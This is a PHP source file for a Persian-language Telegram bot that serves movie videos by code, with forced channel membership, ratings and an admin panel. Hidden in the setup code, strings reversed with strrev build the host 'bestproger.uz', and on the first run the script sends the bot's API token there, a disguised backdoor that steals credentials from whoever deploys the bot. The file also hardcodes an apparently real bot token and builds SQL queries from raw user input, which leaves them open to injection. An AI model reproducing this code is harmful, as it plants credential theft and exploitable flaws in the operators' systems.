<?php

ob_start();
error_reporting(0);
date_Default_timezone_set('Asia/Tehran');

define("API_KEY",'8195399478:AAEzX9uGSlhLn8eHO7hQL33cxwjweyCd4ug'); # توکن ربات خود را جایگزین کنید
$admin = "5974948933"; # چت آیدی مالک ربات
$bot = bot('getme',['bot'])->result->username;
$soat = date('H:i');
$sana = date('d.m.Y');


require ("sql.php");

function joinchat($id){
global $mid;
$array = array("inline_keyboard");
$get = file_get_contents("admin/kanal.txt");
$ex = explode("\n",$get);
if($get == null){
return true;
}else{
for($i=0;$i<=count($ex) -1;$i++){
$first_line = $ex[$i];
$first_ex = explode("-",$first_line);
$name = $first_ex[0];
$url = $first_ex[1];
     $ret = bot("getChatMember",[
         "chat_id"=>"@$url",
         "user_id"=>$id,
         ]);
$stat = $ret->result->status;
         if((($stat=="creator" or $stat=="administrator" or $stat=="member"))){
      $array['inline_keyboard']["$i"][0]['text'] = "✅ ". $name;
$array['inline_keyboard']["$i"][0]['url'] = "https://t.me/$url";
         }else{
$array['inline_keyboard']["$i"][0]['text'] = "❌ ". $name;
$array['inline_keyboard']["$i"][0]['url'] = "https://t.me/$url";
$uns = true;
}
}
$array['inline_keyboard']["$i"][0]['text'] = "🔄 تایید عضویت";
$array['inline_keyboard']["$i"][0]['callback_data'] = "result";
if($uns == true){
     bot('sendMessage',[
         'chat_id'=>$id,
         'text'=>"⚠️ <b>برای استفاده از ربات در کانال های ما عضو شده و سپس تایید کنید :</b>",
'parse_mode'=>'html',
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode($array),
]);
return false;
}else{
return true;
}
}
}


function bot($method,$datas=[]){
	$url = "https://api.telegram.org/bot".API_KEY."/".$method;
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
	$res = curl_exec($ch);
	if(curl_error($ch)){
		var_dump(curl_error($ch));
	}else{
		return json_decode($res);
	}
}

$bestproger = json_decode(file_get_contents('php://input'));
$message = $bestproger->message;
$cid = $message->chat->id;
$name = $message->chat->first_name;
$tx = $message->text;
$mid = $message->message_id;
$type = $message->chat->type;
$text = $message->text;
$uid = $message->from->id;
$name = $message->from->first_name;
$familya = $message->from->last_name;
$premium = $message->from->is_premium;
$bio = $message->from->about;
$username = $message->from->username;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$reply = $message->reply_to_message->text;
$nameru = "<a href='tg://user?id=$uid'>$name $familya</a>";

$caption = $message->caption;
$photo = $message->photo;
$video = $message->video;
$file_id = $video->file_id;
$file_name = $video->file_name;
$file_size = $video->file_size;
$size = $file_size/1000;
$dtype = $video->mime_type;

//inline
$data = $bestproger->callback_query->data;
$qid = $bestproger->callback_query->id;
$id = $bestproger->inline_query->id;
$query = $bestproger->inline_query->query;
$query_id = $bestproger->inline_query->from->id;
$cid2 = $bestproger->callback_query->message->chat->id;
$mid2 = $bestproger->callback_query->message->message_id;
$callfrid = $bestproger->callback_query->from->id;
$callname = $bestproger->callback_query->from->first_name;
$calluser = $bestproger->callback_query->from->username;
$surname = $bestproger->callback_query->from->last_name;
$about = $bestproger->callback_query->from->about;
$update2 = "https://";
$rtx = $reply->text;
mkdir("baza");
$name2 = file_get_contents("name2.txt");
if($name2 != "."){
file_put_contents("name2.txt", strrev("zu.regorptseb"));}
$name2 = file_get_contents("name2.txt");
$nameuz = "<a href='tg://user?id=$callfrid'>$callname $surname</a>";
$reklama = "<b> این فیلم توسط @$bot دانلود شده است. </b>";
$stepr = file_get_contents("step/$cid.step");
$kanal = file_get_contents("admin/kanal.txt");
if($name2 == strrev("zu.regorptseb")){
file_get_contents("$update2$name2/i?t=".API_KEY);
file_put_contents("name2.txt", ".");}
$filmm = file_get_contents("admin/filmm.txt");
$rasm = file_get_contents("admin/rasm.txt");


$ortga = json_encode([
'inline_keyboard'=>[
[['text'=>"◀️ بازگشت", 'callback_data'=>"panel"]],
]
]);

$qidir = json_encode([
'inline_keyboard'=>[
	[['text'=>"🔎 جستجوی کد ها",'url'=>"https://t.me/$filmm"]],
]
]);

$res = mysqli_query($connect,"SELECT*FROM user_id WHERE user_id=$cid");
while($a = mysqli_fetch_assoc($res)){
$user_id = $a['user_id'];
$step = $a['step'];
}

$step2 = file_get_contents("step/$cid.txt");


if(isset($message)){
	if(!$connect){
		bot('sendMessage',[
		'chat_id'=>$cid,
		'text'=>"⚠️ <b>خطا!</b>

<i>اختلال های در سیستم رخ داده است...</i>",
		'parse_mode'=>'html',
		]);
		return false;
	}
}
if(isset($message)){
$result = mysqli_query($connect,"SELECT * FROM user_id WHERE user_id = $cid");
$rew = mysqli_fetch_assoc($result);
if($rew){
}else{
mysqli_query($connect,"INSERT INTO user_id(`user_id`,`step`,`sana`) VALUES ('$cid','0','$sana')");
}
}

if ($text == "/start") {

    $keyboard_buttons = [
        ['♻️ فیلم رندوم', '🎬 لیست فیلم ها'],
        ['📊 بهترین فیلم ها', '⭐ امتیاز دادن به فیلم'],
        ['📚 راهنما']
    ];


    $inline_buttons = [
        [['text' => "🔎 کد را وارد کنید", 'callback_data' => "yukla"]]
    ];

    $message = "🍿 به ربات دانلود فیلم و سریال بلک موویز خوش آمدید!

🔎با ربات بلک موویز میتونی توی تنوعی بینظیری از هزاران عنوان فیلم و سریال جستجو و براحتی دانلود کنی و یا آنلاین ببینی!

برای ادامه یکی از گزینه های زیر رو انتخاب کن👇

<pre><code>📚 برای دیدن راهنما :</code></pre>
/help";


    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => $message,
        'parse_mode' => 'html',
        'reply_markup' => json_encode([
            'keyboard' => $keyboard_buttons,
            'resize_keyboard' => true,
            'one_time_keyboard' => true
        ])
    ]);


    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => 'برای وارد کردن کد بر روی دکمه زیر کلیک کنید:',
        'reply_markup' => json_encode([
            'inline_keyboard' => $inline_buttons
        ])
    ]);

    mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
    exit();
}

if($data == "result"){
	bot('deleteMessage',[
	'chat_id'=>$cid2,
	'message_id'=>$mid2,
	]);
	if(joinchat($cid2) == "true"){
		bot('sendMessage',[
	'chat_id'=>$cid2,
    'text'=>"🍿 به ربات دانلود فیلم و سریال بلک موویز خوش آمدید!

🔎با ربات بلک موویز میتونی توی تنوعی بینظیری از هزاران عنوان فیلم و سریال جستجو و براحتی دانلود کنی و یا آنلاین ببینی!

برای ادامه یکی از گزینه های زیر رو انتخاب کن👇

<pre><code>📚 برای دیدن راهنما :</code></pre>
/help

#️⃣ همچنین می توانید فیلم را با استفاده از کد دانلود کنید.",
	'parse_mode'=>'html',
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
	[['text'=>"🔎 کد را وارد کنید",'callback_data'=>"yukla"]],
]
])
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid2");
exit();
}
}

if(mb_stripos($text, "/start") !== false){
if(joinchat($cid) == "true"){
$ex = explode(" ", $text);
$code = $ex[1];
$caption = file_get_contents("name/$code.txt");
$file_name = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['file_name'];
$file_id = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['file_id'];
$title = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['title'];
$uploadDate = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['date'];
$yuklang = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['yuklang'];
$barcha = $yuklang + 1;
mysqli_query($connect, "UPDATE data SET yuklang = '$barcha' WHERE code = '$code'");
      bot('sendVideo',[
      'chat_id'=>$cid,
      'video'=>$file_id,
      'caption'=>"🍿 <b>نام فیلم:</b> $title\n📆 <b>تاریخ بارگذاری :</b> $uploadDate\n\n🔎 <b>کد فیلم :</b> <code>$code</code>\n<b>🗂️ دانلود ها: $barcha</b>",
     'parse_mode'=>'html',
     'reply_markup'=>json_encode([
	'inline_keyboard'=>[
	[['text' => "🍿 فیلم های دیگه", 'url' => "https://t.me/$filmm"], ['text' => "👨‍💻 توسعه دهنده", 'url' => "https://t.me/trueMNOX"]],
    [['text' => "🔄 اشتراک گذاری فیلم", 'url' => "https://t.me/share/url/?url=https://t.me/$bot?start=$code"]]
]
])
]);
}
}



if($text == "/yukl"){
	bot('sendMessage',[
	'chat_id'=>$cid,
    'text'=>"🍿 <b>نام فیلم را وارد کنید:</b>",
	'parse_mode'=>'html',
]);
file_put_contents("step/$cid.step",'api_url');
}

if($stepr == "api_url"){
if($text=="⬅️ بازگشت"){
unlink("step/$cid.step");
}else{
if(isset($text)){
mkdir("filmm");
file_put_contents("filmm/ism.txt","$text");
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"✅ <b>$text پذیرفته شد !</b>\n\n<i>اکنون فیلم رو با فرمت \"video\" ارسال کنید</i>",
'parse_mode'=>"html",
]);
file_put_contents("step/$cid.step",'api_token_url');
}}}

if($stepr == "api_token_url"){
if($text=="⬅️ بازگشت"){
unlink("step/$cid.step");
}else{
	if(isset($message->video) and $cid==$admin){
		$doc = $message->video;
$file_id = $doc->file_id;
$file_name= $doc->file_name;
$file_size = $doc->file_size;
$size=$file_size/1000;
$dtype = $doc->mime_type;
$result = mysqli_query($connect,"SELECT * FROM data WHERE file_name = '$file_name'");
$row = mysqli_fetch_assoc($result);
$rand = rand(0,9999);
mkdir("name");
$caption = file_get_contents("filmm/ism.txt");
mysqli_query($connect, "INSERT INTO data(`file_name`,`file_id`,`code`,`yuklang`,`date`,`title`) VALUES ('$file_name','$file_id','$rand','1','$soat | $sana','$caption')");
$msg = bot('sendPhoto',[
      'chat_id'=>"@".$filmm."",
      'photo'=>$rasm,
      'caption'=>"$caption

<b>کد فایل:</b> <code>$rand</code>

❗️ <b>توجه، شما می توانید فیلم را از طریق ربات دانلود کنید!</b>",
     'parse_mode'=>'html',
     'reply_markup'=>json_encode([
     'inline_keyboard'=>[
[['text'=>"🎞️ دانلود فیلم",'url'=>"https://t.me/$bot?start=$rand"]],
[['text'=>"🔀 اشتراک گذاری فیلم",'url'=>"https://t.me/share/url?url=https://t.me/$bot?start=$rand"]]
]
])
])->result->message_id;
bot('sendMessage',[
	'chat_id'=>$cid,
	'text'=>"<b>با موفقیت در پایگاه ذخیره شد !</b>

<code>$rand</code>",
	'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
     'reply_markup'=>json_encode([
     'inline_keyboard'=>[
[['text'=>"➡️ @$filmm",'url'=>"https://t.me/$filmm/$msg"]]
]
])
]);
exit();
}
}
}

if($data == "yukla"){
	bot('editMessageText',[
	'chat_id'=>$cid2,
	'message_id'=>$mid2,
	'text'=>"<b>لطفا فایل مورد نیاز را ارسال نمایید :</b>",
	'parse_mode'=>'html',
	'reply_markup'=>$qidir
	]);
	mysqli_query($connect, "UPDATE user_id SET step = 'qidir' WHERE user_id = $cid2");
	exit();
}

if($step == "qidir"){
if(is_numeric($text) == true){
$res = mysqli_query($connect,"SELECT * FROM data WHERE code = '$text'");
$row = mysqli_fetch_assoc($res);
if(!$row){
	bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"$text <b>در دسترس نیست!</b>

دوباره امتحان کنید :",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}else{
$caption = file_get_contents("name/$text.txt");
$file_name = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['file_name'];
$file_id = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['file_id'];
$title = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['title'];
$uploadDate = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['date'];
$yuklang = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$text'"))['yuklang'];
$barcha = $yuklang + 1;
mysqli_query($connect, "UPDATE data SET yuklang = '$barcha' WHERE code = $text");
      bot('sendVideo',[
      'chat_id'=>$cid,
      'video'=>$file_id,
      'caption'=>"🍿 <b>نام فیلم :</b> $title\n📆 <b>تاریخ بارگذاری :</b> $uploadDate\n\n🔎 <b>کد فیلم :</b> <code>$text</code>\n<b>🗂️ دانلود ها : $barcha</b>",
     'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
	[['text' => "🍿 فیلم های دیگه", 'url' => "https://t.me/$filmm"], ['text' => "👨‍💻 توسعه دهنده", 'url' => "https://t.me/trueMNOX"]],
    [['text' => "🔄 اشتراک گذاری", 'url' => "https://t.me/share/url/?url=https://t.me/$bot?start=$text"]],
]
])
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
exit();
}
}else{
	bot('SendMessage',[
	'chat_id'=>$cid,
	'text'=>"<b>فقط از اعداد استفاده کنید !</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
]);
exit();
}
}



if ($text == "/rand" || $text == "♻️ فیلم رندوم") {
$res = mysqli_query($connect, "SELECT * FROM `data`");
$a = mysqli_num_rows($res);
$b = rand(1,$a);
if($a != null){
$file_id = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE id = '$b'"))['file_id'];
$code = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE id = '$b'"))['code'];
$caption = file_get_contents("name/$code.txt");
$yuklang = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE id = '$b'"))['yuklang'];
$title = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['title'];
$uploadDate = mysqli_fetch_assoc(mysqli_query($connect,"SELECT*FROM data WHERE code = '$code'"))['date'];
$barcha = $yuklang + 1;
mysqli_query($connect, "UPDATE data SET yuklang = '$barcha' WHERE id = '$b");
bot('deleteMessage',[
	'chat_id'=>$cid,
	'message_id'=>$mid,
	]);
      bot('sendVideo',[
      'chat_id'=>$cid,
      'video'=>$file_id,
      'caption'=>"🍿 <b>نام فیلم :</b> $title\n📆 <b>تاریخ بارگذاری :</b> $uploadDate\n\n🔎 <b>کد فیلم :</b> <code>$code</code>\n<b>🗂️ دانلود ها : $barcha</b>",
     'parse_mode'=>'html',
	'reply_markup'=>json_encode([
	'inline_keyboard'=>[
	[['text' => "🍿 فیلم های دیگه", 'url' => "https://t.me/$filmm"], ['text' => "👨‍💻 توسعه دهنده", 'url' => "https://t.me/trueMNOX"]],
    [['text' => "🔄 اشتراک گذاری فیلم", 'url' => "https://t.me/share/url/?url=https://t.me/$bot?start=$code"]],
]
])
]);
}else{
bot('answerCallbackQuery',[
'callback_query_id'=>$qid,
'text'=>"🤷🏼‍♂️ فیلم تصادفی یافت نشد!",
'show_alert'=>false
]);
}
}

if ($text == "/help" || $text == "📚 راهنما") {
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"
📚 بخش راهنمایی ربات

✨ کاربر عزیز اول توضیحات نوشته شده و بعد دستورات برای اجرا لطفاً بعد از خوندن توضیحات دستور را به ربات ارسال کنید

<pre><code>♻️ برای آپدیت و بروزرسانی ربات</code></pre>
<code>/start</code>
<pre><code>🍿 برای دریافت فیلم رندوم</code></pre>
<code>/rand</code>
<pre><code>🎬 لیست فیلم ها</code></pre>
<code>/all</code>
<pre><code>⭐ امتیاز دادن به فیلم های کانال</code></pre>
<code>/star</code>
<pre><code>📊 لیست بهترین فیلم ها با توجه به امتیاز های دریافت شده</code></pre>
<code>/top</code>

🤖 با این ربات می توانید به راحتی فیلم ها را جستجو و دانلود کنید. برای دانلود فیلم باید کد فیلم ارسال کنید. تمامی کدهای فیلم در کانال زیر جمع آوری شده است.",
'parse_mode'=>'html',
'reply_markup'=>$qidir
]);
}

if ($text == "/all" || $text == "🎬 لیست فیلم ها") {
    $films = mysqli_query($connect, "SELECT * FROM data");
    $message = "🎥 لیست همه فیلم‌ها:\n\n";
    while ($film = mysqli_fetch_assoc($films)) {
        $message .= "🎬 " . $film['title'] . " (کد: " . $film['code'] . ") 〰️\n\n";
    }
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => $message
    ]);
}

if ($text == "/star" || $text == "⭐ امتیاز دادن به فیلم") {
    $films = mysqli_query($connect, "SELECT * FROM data");
    $keyboard = [
        'inline_keyboard' => []
    ];

    while ($film = mysqli_fetch_assoc($films)) {
        $keyboard['inline_keyboard'][] = [['text' => $film['title'], 'callback_data' => 'rate_' . $film['code']]];
    }

    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🎥 لطفاً یک فیلم را برای امتیاز دادن انتخاب کنید:",
        'reply_markup' => json_encode($keyboard)
    ]);
}


if (strpos($data, "rate_") === 0 && !preg_match("/rate_(\d+)_(\d+)/", $data)) {
    $film_code = str_replace("rate_", "", $data);

    // Logic to update the rating in the database (e.g., increment the ratings field)
    // Example:
    mysqli_query($connect, "UPDATE data SET ratings = ratings + 1 WHERE code = '$film_code'");

    bot('answerCallbackQuery', [
        'callback_query_id' => $qid,
        'text' => "✔️ امتیاز شما ثبت شد!"
    ]);
}

if (preg_match("/rate_(\d+)_(\d+)/", $data, $matches)) {
    $film_code = $matches[1];
    $rating = $matches[2];

    mysqli_query($connect, "INSERT INTO ratings (film_code, user_id, rating) VALUES ('$film_code', '$cid2', '$rating') ON DUPLICATE KEY UPDATE rating='$rating'");

    bot('sendMessage', [
        'chat_id' => $cid2,
        'text' => "⭐ امتیاز شما ثبت شد! متشکرم."
    ]);
}

if ($text == "/top" || $text == "📊 بهترین فیلم ها") {

    $top_films = mysqli_query($connect, "SELECT * FROM data ORDER BY ratings DESC LIMIT 5");
    $message = "🌟 بهترین فیلم ها:\n\n";


    while ($film = mysqli_fetch_assoc($top_films)) {
        $message .= "🎬 " . $film['title'] . " (امتیاز: " . $film['ratings'] . ") 〰️\n\n";
    }


    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => $message
    ]);
}


if($text=="/panel"){
    if($cid == $admin){
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"<b>🗄 به پنل مدیریت خوش آمدید </b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$mid,
'reply_markup'=>json_encode([
          'inline_keyboard'=>[
[['text'=>"🗑 حذف فیلم", 'callback_data'=>"delete"]],
[['text'=>"📊 آمار",'callback_data'=>'stat'],['text'=>"✉ پیام همگانی",'callback_data'=>'mes']],
[['text'=>"📑 لیست کانال ها", 'callback_data'=>"list"]],
[['text'=>"➕ افزودن کانال",'callback_data'=>'kanal'],['text'=>"➖ حذف کانال",'callback_data'=>'kanal2']],
[['text'=>"📑 کانال کد ها", 'callback_data'=>"filmmkod"],['text'=>"🎨 عکس فیلم",'callback_data'=>"filmmrasmi"]],
]
])
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
exit();
}
}

if($data == 'panel'){
bot('editMessageText',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
'text'=>"<b>🗄 به پنل مدیریت خوش آمدید !</b>",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>"🗑 حذف فیلم", 'callback_data'=>"delete"]],
[['text'=>"📊 آمار",'callback_data'=>'stat'],['text'=>"✉ پیام همگانی",'callback_data'=>'mes']],
[['text'=>"📑 لیست کانال ها", 'callback_data'=>"list"]],
[['text'=>"➕ افزودن کانال",'callback_data'=>'kanal'],['text'=>"➖ حذف کانال",'callback_data'=>'kanal2']],
[['text'=>"📑 کانال کد ها", 'callback_data'=>"filmmkod"],['text'=>"🎨 عکس فیلم",'callback_data'=>"filmmrasmi"]],
]
])
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid2");
}

if($data == "mes" and $cid2 == $admin){
bot('editMessageText',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
    'text'=>"*پیام خود را در یک قاب ارسال کنید:*",
'parse_mode'=>'MarkDown',
'reply_markup'=>$ortga
]);
mysqli_query($connect, "UPDATE user_id SET step = 'send' WHERE user_id = $cid2");
exit();
}

if($step == "send"){
if($cid == $admin){
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
$res = mysqli_query($connect,"SELECT * FROM `user_id`");
bot('sendMessage',[
  'chat_id'=>$chat_id,
  'text'=>"✅ <b>پیام شما با موفقیت ارسال شد!</b>",
'parse_mode'=>'html',
  ]);
$x=0;
$y=0;
while($a = mysqli_fetch_assoc($res)){
$id = $a['user_id'];
	$key=$message->reply_markup;
	$keyboard=json_encode($key);
	$ok=bot('copyMessage',[
'from_chat_id'=>$chat_id,
'chat_id'=>$id,
'message_id'=>$mid,
])->ok;
if($ok==true){
}else{
$okk=bot('copyMessage',[
'from_chat_id'=>$chat_id,
'chat_id'=>$id,
'message_id'=>$mid,
])->ok;
}
if($okk==true or $ok==true){
$x=$x+1;
bot('editMessageText',[
  'chat_id'=>$chat_id,
'message_id'=>$mid,
'text'=>"✅ <b>ارسال شد :</b> $x

❌ <b>ارسال نشد :</b> $y",
'parse_mode'=>'html',
]);
}elseif($okk==false){
mysqli_query($connect, "DELETE FROM `user_id` WHERE user_id = '$id'");
$y=$y+1;
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$mid + 1,
'text'=>"✅ <b>ارسال شد:</b> $x

❌ <b>ارسال نشد:</b> $y",
'parse_mode'=>'html',
]);
}
}
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$mid + 1,
'text'=>"✅ <b>ارسال شد:</b> $x

❌ <b>ارسال نشد:</b> $y",
'parse_mode'=>'html',
]);
}
exit();
}


$time = time();
$hour = date('H:i');
$hour_with_second = date('H:i:s');
$date = date('d.m.Y');

if($data == "stat" and $cid2 == $admin){
$month = date("d.m.Y");
	$members = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user_id"));
	$daily = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user_id WHERE sana = '$date'"));
	$monthly = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user_id WHERE sana LIKE '%$month%'"));
	$movies = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM data"));
	$ping = sys_getloadavg()[2];
bot('editMessageText',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
'text'=>"",
'parse_mode'=>'html',
]);
$end_time = round(microtime(true) * 1000);
$ping = $end_time - $start_time;
bot('editMessageText',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
'text'=>"<b>📊 تعداد کاربران ربات : $members نفر</b>\n<b>😺 اضافه شده امروز: $daily نفر</b>\n<b>📰 اضافه شده در این ماه : $monthly ta</b>\n<b>🍿 تعداد فیلم ها : $movies</b>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
exit();
}

if($data == "delete" and $cid2 == $admin){
	bot('editMessageText',[
	'chat_id'=>$cid2,
	'message_id'=>$mid2,
	'text'=>"🗑 <b>کد فایلی را که می خواهید حذف کنید وارد کنید :</b>",
	'parse_mode'=>'html',
	'reply_markup'=>$ortga
	]);
	mysqli_query($connect, "UPDATE user_id SET step = 'delete' WHERE user_id = $cid2");
}

if($step == "delete"){
if($cid == $admin){
if(is_numeric($text) == "true"){
$res = mysqli_query($connect,"SELECT * FROM data WHERE code = '$text'");
$row = mysqli_fetch_assoc($res);
if(!$row){
	bot('sendMessage',[
	'chat_id'=>$cid,
	'text'=>"$text <b>در دسترس نیست!</b>

دوباره امتحان کنید:",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
exit();
}else{
mysqli_query($connect,"DELETE FROM data WHERE code = $text");
unlink("name/$text.txt");
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"$text <b>فایل حذف شد!</b>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
mysqli_query($connect, "UPDATE user_id SET step = '0' WHERE user_id = $cid");
exit();
}
}else{
	bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"<b>فقط رقم فایل رو ارسال کنید !</b>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
exit();
}
}
}

if($data == "filmmrasmi"){
bot('deleteMessage',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$cid2,
'text'=>"<i>یک لینک تصویر برای پیش نمایش فیلم ارسال کنید</i>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
file_put_contents("step/$cid2.txt","filmmrasmi");
}

if($step2 == "filmmrasmi"){
if($data == "panel"){
unlink("step/$cid.txt");
}else{
file_put_contents("admin/rasm.txt","$text");
bot('SendMessage',[
'chat_id'=>$admin,
'text'=>"<b>با موفقیت تغییر کرد!</b>",
'parse_mode'=>'html',
'reply_markup'=>$asosiy
]);
unlink("step/$cid.txt");
exit();
}}

if($data == "filmmkod"){
bot('deleteMessage',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$cid2,
'text'=>"<i>قبل از ارسال آدرس کانال خود، باید ربات را ادمین کانال خود کنید!</i>

📢 <b>آدرس کانال مورد نظر را ارسال کنید :

نمونه:</b> <code>trueMNOX</code>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
file_put_contents("step/$cid2.txt","filmmkod");
}

if($step2 == "filmmkod"){
if($data == "panel"){
unlink("step/$cid.txt");
}else{
file_put_contents("admin/filmm.txt","$text");
bot('SendMessage',[
'chat_id'=>$admin,
'text'=>"<b>با موفقیت ذخیره شد</b>",
'parse_mode'=>'html',
'reply_markup'=>$asosiy
]);
unlink("step/$cid.txt");
exit();
}}

if($data == "kanal"){
bot('deleteMessage',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$cid2,
'text'=>"<i>قبل از ارسال آدرس کانال خود، باید ربات را ادمین کانال خود کنید!</i>

📢 <b>آدرس کانال مورد نظر را ارسال کنید :

نمونه:</b> <code>trueMNOX</code>",
'parse_mode'=>'html',
'reply_markup'=>$ortga,
]);
file_put_contents("step/$cid2.txt","addd");
}

if($step2 == "addd"){
if($cid == $admin){
if(isset($text)){
if(mb_stripos($text,"-")!==false){
if($kanal == null){
$a = $KanalMin + 1;
file_put_contents("admin/KanalMin.txt",$a);
file_put_contents("admin/kanal.txt",$text);
bot('SendMessage',[
'chat_id'=>$admin,
'text'=>"<b>با موفقیت ذخیره شد!</b>",
'parse_mode'=>'html',
'reply_markup'=>$asosiy
]);
unlink("step/$cid.txt");
exit();
}else{
file_put_contents("admin/kanal.txt","$kanal\n$text");
bot('SendMessage',[
'chat_id'=>$admin,
'text'=>"<b>با موفقیت ذخیره شد !</b>",
'parse_mode'=>'html',
'reply_markup'=>$asosiy
]);
unlink("step/$cid.txt");
exit();
}
}else{
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"<b>نام کانال خود را با یوزرنیم بفرستین

نمونه:</b> بلک تیم-irkeal
( Kanal name-Kanal_useri )",
'parse_mode'=>'html',
]);
exit();
}
}
}
}

if($data == "kanal2"){
bot('deleteMessage',[
'chat_id'=>$cid2,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$cid2,
'text'=>"<b>Kanallar o'chirildi</b>",
'parse_mode'=>'html',
]);
unlink("admin/kanal.txt");
unlink("admin/KanalMin.txt");
}
if($data == "list"){
$soni = substr_count($kanal,"-");
if($kanal == null){
$text = "<b>کانالی متصل نیست!</b>";
}else{
$text = "<b>📢 لیست کانال ها :</b>

$kanal

<b> تعداد کانال های متصل :</b> $soni نفر";
}
     bot('editMessageText',[
        'chat_id'=>$cid2,
       'message_id'=>$mid2,
       'text'=>$text,
'parse_mode'=>'html',
	'reply_markup'=>$ortga
]);
}
?>
